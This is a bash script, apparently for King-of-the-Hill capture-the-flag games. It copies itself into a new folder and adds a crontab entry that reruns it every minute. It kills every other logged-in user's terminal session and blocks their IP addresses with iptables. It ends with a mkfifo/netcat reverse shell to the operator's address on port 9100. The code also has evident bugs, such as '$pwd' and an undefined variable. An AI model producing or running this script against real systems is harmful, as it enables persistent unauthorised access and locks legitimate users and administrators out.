#!/bin/bash

function King() {
    echo "[+] Starting execution"
    
    root_path=$pwd
    echo "[+] Cd to / make folder tmp.d and cd tmp.d"
    cd / && mkdir tmp.d && cd tmp.d
    new_folder_path=$pwd
    echo "[+] path : $new_folder_path"
    cd $root_path
    cat < koth.sh > shell.sh
    mv shell.sh $new_folder_path
    echo "[+] Moving shell.sh to $new_root_path"
    echo "[+] Adding Crontab"
    $(crontab -l 2>/dev/null; echo "* * * * * /bin/bash $new_folder_path/shell.sh") | crontab -
    # Check if the script is running as root
    if [ "$EUID" -ne 0 ]; then
        echo "[-] Please run as root."
        exit 1
    fi

    # Check if an argument (your IP address) is provided
    if [ -z "$1" ]; then
        echo "[-] No IP address provided. Usage: ./koth.sh <YOUR_IP_ADDRESS>"
        exit 1
    fi

    # Store your IP address
    YOUR_IP="$1"

    # Extract TTYs and IPs, display your TTY, and list others
    echo "[+] Checking for TTYs with IPs:"
    w -h | awk '{print $2, $3}' | while read -r TTY IP; do
        if [[ $IP =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            if [ "$IP" == "$YOUR_IP" ]; then
                echo "[!] Your TTY: $TTY | Your IP: $IP"
            else
                echo "Other TTY: $TTY | Other IP: $IP"
                echo "[-] Killing TTY"
                $(pkill -t -9 $TTY)
                echo "[-] Blocking IP"  
                $(iptables -A INPUT -s $IP -j DROP)
            fi
        fi
    done

    # revshell
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $YOUR_IP 9100 >/tmp/f
}

# Call the function with the provided argument
King "$1"
